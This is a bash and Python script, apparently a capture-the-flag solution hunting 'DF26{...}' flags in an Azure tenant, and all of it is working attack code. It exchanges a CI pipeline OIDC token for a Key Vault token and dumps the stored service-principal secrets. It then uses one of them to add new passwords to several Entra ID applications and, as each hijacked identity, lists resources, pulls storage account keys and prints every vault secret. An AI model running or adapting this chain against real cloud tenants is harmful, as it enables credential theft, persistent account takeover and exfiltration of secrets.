#!/usr/bin/env bash
set -u
: "${AZURE_CLIENT_ID:=72ff278a-9e71-43ec-bac4-2ca303f8e462}"
: "${AZURE_TENANT_ID:=3205c325-06a5-4171-9ce8-ffc5e6c2845e}"
OIDC=$(curl -sS -H "Authorization: bearer ${ACTIONS_ID_TOKEN_REQUEST_TOKEN}" "${ACTIONS_ID_TOKEN_REQUEST_URL}&audience=api://AzureADTokenExchange" | python3 -c 'import sys,json;print(json.load(sys.stdin)["value"])')
VT=$(curl -sS -X POST "https://login.microsoftonline.com/${AZURE_TENANT_ID}/oauth2/v2.0/token" -d client_id="${AZURE_CLIENT_ID}" -d grant_type=client_credentials -d client_assertion_type=urn:ietf:params:oauth:client-assertion-type:jwt-bearer --data-urlencode "client_assertion=${OIDC}" --data-urlencode "scope=https://vault.azure.net/.default" | python3 -c 'import sys,json;print(json.load(sys.stdin)["access_token"])')
export VT
python3 - <<'PY'
import os,json,urllib.request,urllib.parse,re
VT=os.environ["VT"];TID="3205c325-06a5-4171-9ce8-ffc5e6c2845e";SUB="c5e4e004-b42d-4ac4-a502-5fd338380eb6"
def api(u,t,method="GET",data=None,ct="application/json"):
    h={"Authorization":"Bearer "+t}
    if data is not None:h["Content-Type"]=ct
    try:return urllib.request.urlopen(urllib.request.Request(u,headers=h,method=method,data=data),timeout=25).read().decode()
    except Exception as e:
        try:return "ERR:"+e.read().decode()[:160]
        except:return "ERR:"+str(e)
def tok(c,x,sc):
    d=urllib.parse.urlencode({"client_id":c,"client_secret":x,"grant_type":"client_credentials","scope":sc}).encode()
    try:return json.load(urllib.request.urlopen(f"https://login.microsoftonline.com/{TID}/oauth2/v2.0/token",d,timeout=20)).get("access_token")
    except:return None
def hit(tag,s):
    for m in set(re.findall(r'DF26\{[^}]*\}',s)):print("  !!!FLAG",tag,":"," ".join(m))
PV="https://kv-tbl-prod-x3euoz.vault.azure.net"
sps={}
for s in json.loads(api(PV+"/secrets?api-version=7.4",VT))["value"]:
    try:
        j=json.loads(json.loads(api(s["id"]+"?api-version=7.4",VT))["value"]);sps[j["appId"]]=j["clientSecret"]
    except:pass
DA="2c34300e-1bc0-41e7-9c1e-8b7571d72c72"
gt=tok(DA,sps[DA],"https://graph.microsoft.com/.default")
apps={}
for a in json.loads(api("https://graph.microsoft.com/v1.0/applications?$select=id,appId,displayName&$top=200",gt)).get("value",[]):
    apps[a["displayName"]]=(a["id"],a["appId"])
print("apps:",{k:v[1] for k,v in apps.items() if k.startswith("tbl")})
TARGETS=["tbl-legacy-admin","tbl-platform-automation","tbl-cicd-deployer","tbl-directory-sync","tbl-reporting-insights"]
def probe(appid,secret,label):
    print(f"  == as {label} ({appid}) ==")
    at=tok(appid,secret,"https://management.azure.com/.default")
    if at:
        subs=api(f"https://management.azure.com/subscriptions/{SUB}/resources?api-version=2021-04-01",at);hit("res",subs)
        # listKeys mọi storage
        for r in json.loads(subs).get("value",[]) if subs.startswith("{") else []:
            if r.get("type")=="Microsoft.Storage/storageAccounts":
                lk=api(f"https://management.azure.com{r['id']}/listKeys?api-version=2023-01-01",at,method="POST",data=b"")
                print("   listKeys",r["name"],":","OK" if '"keys"' in lk else lk[:60])
        print("   ARM subs resp:",subs[:80])
    vt=tok(appid,secret,"https://vault.azure.net/.default")
    if vt:
        for V in ["kv-tbl-sec-x3euoz","kv-tbl-prod-x3euoz"]:
            r=api(f"https://{V}.vault.azure.net/secrets?api-version=7.4",vt);hit("vault "+V,r)
            if '"value"' in r:
                print(f"   {V} secrets:",[x['id'].rsplit('/',1)[-1] for x in json.loads(r)['value']])
                for x in json.loads(r)["value"]:
                    val=api(x["id"]+"?api-version=7.4",vt);hit(V+":"+x["id"].rsplit("/",1)[-1],val)
                    print("     ",x["id"].rsplit("/",1)[-1],"=",json.loads(val).get("value","")[:200])
            else:print(f"   {V}:",r[:80])
for t in TARGETS:
    if t not in apps:continue
    oid,appid=apps[t]
    body=json.dumps({"passwordCredential":{"displayName":"x"}}).encode()
    r=api(f"https://graph.microsoft.com/v1.0/applications/{oid}/addPassword",gt,method="POST",data=body)
    if '"secretText"' in r:
        sec=json.loads(r)["secretText"];print(f"[+] addPassword {t} OK")
        probe(appid,sec,t)
    else:
        print(f"[-] addPassword {t}:",r[:110])
print("== done ==")
PY
